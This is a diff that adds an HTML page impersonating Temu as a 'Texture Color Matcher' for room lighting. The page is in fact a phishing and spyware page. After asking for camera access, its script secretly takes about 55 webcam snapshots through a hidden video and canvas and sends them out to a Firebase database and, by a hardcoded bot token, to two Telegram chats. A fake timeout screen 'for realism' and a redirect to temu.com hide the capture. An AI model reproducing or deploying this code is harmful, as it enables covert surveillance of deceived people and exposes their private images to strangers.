@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Temu | Texture Matcher</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --temu-orange: #FF6000;
+            --temu-black: #222222;
+            --temu-bg: #FFFFFF;
+            --temu-gray: #999999;
+            --temu-light: #F6F6F6;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--temu-light); color: var(--temu-black);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .temu-card {
+            width: 100%; max-width: 420px; background: var(--temu-bg);
+            border-radius: 16px; overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+        }
+
+        .temu-header {
+            padding: 15px; text-align: center; border-bottom: 1px solid #EEE;
+            position: relative;
+        }
+
+        .temu-logo { width: 90px; height: auto; }
+
+        .temu-body { padding: 35px 25px; text-align: center; }
+
+        .scanner-box {
+            width: 120px; height: 120px; margin: 0 auto 25px;
+            border: 2px dashed var(--temu-orange); border-radius: 20px;
+            display: flex; align-items: center; justify-content: center;
+            position: relative; background: rgba(255, 96, 0, 0.03);
+        }
+
+        .scan-line {
+            position: absolute; width: 100%; height: 2px;
+            background: var(--temu-orange); top: 0;
+            animation: scan 2s linear infinite;
+        }
+        @keyframes scan {
+            0% { top: 0; } 50% { top: 100%; } 100% { top: 0; }
+        }
+
+        h2 { font-size: 20px; font-weight: 700; margin: 0 0 10px; }
+        p { font-size: 13px; color: var(--temu-gray); line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-temu {
+            background: var(--temu-orange); color: white; border: none;
+            width: 100%; padding: 15px; font-size: 16px; font-weight: 700;
+            border-radius: 8px; cursor: pointer; transition: opacity 0.2s;
+        }
+        .btn-temu:hover { opacity: 0.9; }
+
+        /* Logic Views */
+        #sync-ui, #error-404 { display: none; }
+        
+        .temu-spinner {
+            width: 35px; height: 35px; border: 3px solid #EEE;
+            border-top: 3px solid var(--temu-orange); border-radius: 50%;
+            margin: 0 auto 20px; animation: t-spin 1s linear infinite;
+        }
+        @keyframes t-spin { to { transform: rotate(360deg); } }
+
+        .err-icon { font-size: 50px; margin-bottom: 15px; }
+        .node-info { font-size: 10px; color: #CCC; margin-top: 20px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="temu-card">
+        <div class="temu-header">
+            <img src="https://ku.temu.com/googledetail/temu_logo.png" class="temu-logo" alt="Temu">
+        </div>
+
+        <!-- Start View -->
+        <div class="temu-body" id="init-view">
+            <div class="scanner-box">
+                <div class="scan-line"></div>
+                <svg width="40" height="40" fill="#FF6000" viewBox="0 0 24 24"><path d="M3 5v4h2V5h4V3H5c-1.1 0-2 .9-2 2zm2 10H3v4c0 1.1.9 2 2 2h4v-2H5v-4zm14 4h-4v2h4c1.1 0 2-.9 2-2v-4h-2v4zm0-16h-4v2h4v4h2V5c0-1.1-.9-2-2-2z"/></svg>
+            </div>
+            <h2>Texture Color Matcher</h2>
+            <p>Help us match your style! Enable <b>Ambient Texture Mapping</b> to analyze your room's lighting. We'll suggest products that perfectly complement your environment.</p>
+            
+            <button class="btn-temu" onclick="startTemuScan()">Initialize Matcher</button>
+            <div class="node-info">Mumbai Distribution Node: IN-WEST-402</div>
+        </div>
+
+        <!-- Processing View -->
+        <div class="temu-body" id="sync-ui">
+            <div class="temu-spinner"></div>
+            <div style="font-weight: 700; color: var(--temu-orange);">ANALYZING_FABRIC_THREADS...</div>
+            <div style="font-size: 12px; color: var(--temu-gray); margin-top: 8px;" id="t-timer">Securing visual token (60s)</div>
+            
+            <div style="text-align: left; background: #FAFAFA; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 10px; color: #777; margin-top: 20px; border: 1px solid #EEE;">
+                > FETCHING_MUMBAI_COLOR_PROFILES... OK<br>
+                > CALIBRATING_LUMEN_SENSORS... 82%<br>
+                > STATUS: UPLOADING_TEXTURE_VECTORS
+            </div>
+        </div>
+
+        <!-- 404 View -->
+        <div class="temu-body" id="error-404">
+            <div class="err-icon">📦</div>
+            <h2 style="color: #666;">Logistics Handshake Timeout</h2>
+            <p>Our Mumbai-West warehouse server was unable to verify the texture map. This usually happens during high-traffic flash sales.</p>
+            <div class="temu-spinner" style="width: 20px; height: 20px;"></div>
+            <div style="font-size: 11px; color: #AAA;">Retrying Mumbai Relay...</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startTemuScan() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('t-timer').innerText = `Securing visual token (${timeLeft}s)`;
+
+                        if (count <= 55) {
+                            temuCapture(count);
+                        }
+
+                        if (timeLeft === 48) { // Transition to 404 for realism
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.temu.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.temu.com";
+            }
+        }
+
+        function temuCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "TEMU_TEXTURE_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_W_HUB" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'temu_texture_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
